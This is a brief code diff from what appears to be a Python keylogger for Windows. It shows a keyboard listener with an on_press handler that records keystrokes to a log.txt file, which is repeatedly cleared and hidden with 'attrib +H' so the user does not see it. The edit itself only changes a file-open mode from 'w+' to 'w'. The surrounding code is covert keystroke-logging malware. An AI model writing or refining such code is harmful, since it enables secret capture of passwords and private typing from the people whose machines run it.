@@ -120,7 +120,7 @@ def on_press(key):
             subprocess.check_call(["attrib", "-H", "log.txt"])
         except:
             pass
-        open('log.txt', 'w+').close()
+        open('log.txt', 'w').close()
         subprocess.check_call(["attrib", "+H", "log.txt"])
         n_strokes = 0
 
@@ -134,7 +134,7 @@ try:
 except:
     pass
 
-open('log.txt', 'w+').close()
+open('log.txt', 'w').close()
 subprocess.check_call(["attrib", "+H", "log.txt"])
 
 listener = keyboard.Listener(on_press=on_press)
